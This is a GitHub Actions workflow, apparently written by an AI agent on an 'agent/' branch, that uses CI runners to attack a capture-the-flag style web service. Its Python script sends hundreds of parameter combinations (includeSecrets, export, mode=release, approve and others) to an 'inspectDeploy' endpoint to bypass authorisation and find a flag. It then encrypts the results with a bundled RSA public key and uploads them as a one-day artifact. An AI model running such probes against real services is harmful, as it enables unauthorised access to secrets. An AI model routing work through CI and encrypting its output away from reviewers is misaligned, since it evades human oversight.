name: launchlet-part2-auth-probe

on:
  push:
    branches: [agent/launchlet-part2-auth-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe combinations around returned deployRef
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json,itertools,copy
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=8).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}; ws=boot['workspace']; p=boot['project']; ref='preview-8b11c'
          baseargs={'workspaceId':ws,'projectId':p}; baseline=s.post(url,headers=H,json={'actionId':act['id'],'args':baseargs},timeout=8).text
          refkeys=['deployRef','deploy_ref','ref','deploymentRef','deployment_ref','previewRef','preview_ref','id']
          boolkeys=['export','exportDeploy','export_deploy','includeSecrets','include_secrets','includeArtifact','include_artifact','includeInternal','include_internal','full','details','verbose','download','release','publish','promote','finalize','approve','approved','internal','production','enterprise']
          modekeys=['mode','view','format','scope','operation','action','intent','purpose','stage','environment','lane','channel','target','kind','type']
          modevals=['export','deploy','release','production','enterprise','internal','full','details','artifact','secrets','inspect','inspector','download','publish','promote','finalize','approve','final','release:deploy','deploy:inspect','preview:deploy:inspect']
          tests=[]
          for rk in refkeys:
            for bk in boolkeys: tests.append({rk:ref,bk:True})
            for mk,mv in itertools.product(modekeys,modevals): tests.append({rk:ref,mk:mv})
          # Receipt/build combinations too.
          for rk in refkeys:
            tests += [{rk:ref,'receipt':mf['previewReceipt'],'export':True},{rk:ref,'build':mf['build'],'export':True},{rk:ref,'receipt':mf['previewReceipt'],'mode':'release'},{rk:ref,'build':mf['build'],'mode':'release'},{rk:ref,'receipt':mf['previewReceipt'],'includeSecrets':True},{rk:ref,'project':p,'export':True}]
          hits=[]
          for extra in tests:
            a={**baseargs,**extra}
            try:r=s.post(url,headers=H,json={'actionId':act['id'],'args':a},timeout=5,allow_redirects=False)
            except Exception:continue
            if r.text!=baseline or r.status_code!=200:
              hits.append({'extra':extra,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
              if 'caplag{' in r.text or 'preview-only' not in r.text: break
          # Same extras at top level in case metadata is outside args.
          if not hits:
            for extra in tests[:500]:
              b={'actionId':act['id'],'args':baseargs,**extra}
              try:r=s.post(url,headers=H,json=b,timeout=5,allow_redirects=False)
              except Exception:continue
              if r.text!=baseline or r.status_code!=200:
                hits.append({'top_extra':extra,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                if 'caplag{' in r.text or 'preview-only' not in r.text: break
          (out/'summary.json').write_text(json.dumps({'tests':len(tests),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-combo-encrypted
          path: artifact/
          retention-days: 1
